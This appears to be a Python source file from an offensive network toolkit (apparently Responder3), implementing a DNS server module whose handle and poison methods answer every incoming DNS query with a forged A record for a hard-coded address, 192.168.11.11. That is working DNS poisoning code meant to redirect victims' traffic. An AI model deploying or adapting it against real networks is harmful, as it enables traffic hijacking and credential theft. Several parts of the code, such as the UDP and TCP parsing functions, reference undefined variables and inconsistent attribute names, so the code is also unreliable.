import io
import logging
import traceback
import socket
import struct
import enum
import traceback
import ipaddress

from responder3.utils import ServerProtocol
from responder3.newpackets.DNS import * 
from responder3.servers.BASE import ResponderServer, ResponderProtocolUDP, ResponderProtocolTCP

class DNS(ResponderServer):
	def __init__(self):
		ResponderServer.__init__(self)

	def setup(self):
		self.protocol = DNSProtocolUDP
		if self.bind_proto == ServerProtocol.TCP:
			self.protocol = DNSProtocolTCP

	def modulename(self):
		return 'DNS'

	def handle(self, packet, addr, transport):
		try:
			#self.log(logging.DEBUG,'Handle called with data: ' + data.hex())
			print(repr(packet))
			pp = self.poison(packet, ipaddress.ip_address('192.168.11.11'))
			transport.sendto(pp.toBytes(), addr)
			self.log(logging.DEBUG,'Sending response!')
			

		except Exception as e:
			traceback.print_exc()
			self.log(logging.INFO,'Exception! %s' % (str(e),))
			pass

	def poison(self, requestPacket, poisonAddr, poisonName = None):
		self.log(logging.DEBUG,'Poisoning!')
		res = DNSResource()
		res.construct(requestPacket.Questions[0].QNAME.name, DNSType.A, poisonAddr)
		pp = DNSPacket()

		pp.construct(TID = requestPacket.TransactionID, 
					 response = DNSResponse.RESPONSE, 
					 answers = [res],
					 questions = requestPacket.Questions)

		return pp


class DNSProtocolUDP(ResponderProtocolUDP):
	
	def __init__(self, server):
		ResponderProtocolUDP.__init__(self, server)

	def _parsebuff(self, addr):
		
		packet = DNSPacket(data, ServerProtocol.UDP)
		self._server.log(logging.INFO,'Remained data: ' + data.read().hex())
		self._server.handle(packet, addr, self._transport)


class DNSProtocolTCP(ResponderProtocolTCP):
	
	def __init__(self, server):
		ResponderProtocolTCP.__init__(self, server)

	def data_received(self, raw_data):
		try:
			self._buffer += raw_data
			if self._parsed_length is None:
				self._parsebuff()
			elif len(self._buffer) == self.parsed_length:
				self._parsebuff()
			elif len(self._buffer) > self._buffer_maxsize:
				raise Exception('Too much data recieved!!!')
			else:
				return
		except Exception as e:
			self._server.log(logging.INFO, 'Data reception failed! Reason: %s' % str(e))
			
		
	def _parsebuff(self):
		if self._parsed_length is None and len(self._buffer) > 2:
			self._parsed_length = int.from_bytes(self._buffer[:2], byteorder = 'big', signed=False)

		if len(self._buffer) == self.parsed_length:
			self._server.log(logging.INFO,'Buffer contents: %s' % (self._buffer.hex()))
			packet = DNSPacket(data, ServerProtocol.TCP)
			self._server.log(logging.INFO,'Remained data: ' + data.read().hex())
			self._server.handle(packet, addr, self._transport)